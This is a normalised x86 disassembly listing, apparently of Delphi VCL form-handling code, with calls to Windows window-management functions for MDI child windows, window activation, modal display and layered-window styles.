cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_452324
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_434b10
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4522f4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450fb0
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43536c
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_452318
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_434b54
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4522e8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_44eeb8
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44eeb8
jmp r-xdata
sub_450eb5
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_454884
call sub_403954
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44fc08
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_438e40
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43b8e8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450fb0
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b8e8
call sub_44b86c
mov ebx eax
sub_450ffc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_451054
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f320
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4510b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403164
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_4510c0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403360
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4510ec
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_454870
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403360
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_45128c
jmp r-xdata
mov eax ebx
call sub_451328
mov dl 0x1
mov eax ebx
call sub_44ee78
jmp r-xdata
sub_451190
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_44e804
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_44e850
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_4511f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4035ec#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403360
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_451328
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4512ac
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45131a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451321
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_44fb04
sub_451344
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45160c
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43396c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_4537e4
xor edx edx
push ebp
push sub_4515ef
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_416b94
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_452814
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_44b71c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4515cd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_451294
xor edx edx
push ebp
push sub_45152c
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4511f4
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_4545f0
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_43b8e8
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451533
mov eax [ ebp - 0x4 ]
call sub_45128c
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_451533
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4515d7
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_452814
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_452814
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_416b10
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_416c5c
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44b7d0
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45161c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_438618
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45161c
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4385dc
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45168c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45161c
pop ecx
mov eax [ esi + 0x34 ]
call sub_446b74
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_446b84
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_451710
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439c38
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403360
sub_451734
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403360
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_451764
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_438618
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451734
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451764
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4385dc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4517e0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_451734
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_451734
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_451764
pop ecx
test al al
je r-xdata
sub_451834
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403360
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_451864
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_438618
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451834
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451864
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4385dc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4518e0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_451834
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_451834
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_451864
pop ecx
test al al
je r-xdata
sub_451934
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_416b18
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_44125c
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_451988
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_451934
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403360
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451a04
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41cc48
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_451a40
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4355f0
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_4362b4
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_451a88
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_43bbec
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_43b8e8
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_43b8e8
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_43b8e8
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_43b8e8
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_43b8e8
push eax
call RedrawWindow
sub_451bdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_44c98c
mov dl 0x5
mov eax ebx
call sub_44e700
mov dl 0x1
mov eax ebx
call sub_43a4c4
mov dl 0x3
mov eax ebx
call sub_44e9fc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_451c44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_451d1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43a384
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43a1f0
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_434620
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_435080
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_403f8c
mov eax [ ebp - 0xc ]
call sub_40415c
push eax
mov eax [ ebp - 0xc ]
call sub_40435c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_435090
mov eax [ ebp - 0xc ]
call sub_40415c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451d22
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
mov dl 0x1
mov eax esi
call sub_44dd80
mov edx [ ebp - 0xc ]
mov eax esi
call sub_43513c
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4044e8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_451d48
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_438618
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_44d4a4
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_4385dc
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403360
inc ebp
dec edi
jne r-xdata
sub_451d94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_43a384
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_451dc0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ab8c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_451de8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_450150
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43b8e8
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_43a384
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b8e8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43b8e8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43a398
or ecx 0xffffffff
mov dl 0x1
call sub_4357a8
pop esi
pop ebx
retn
sub_451e80
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43affc
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_4362b4
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
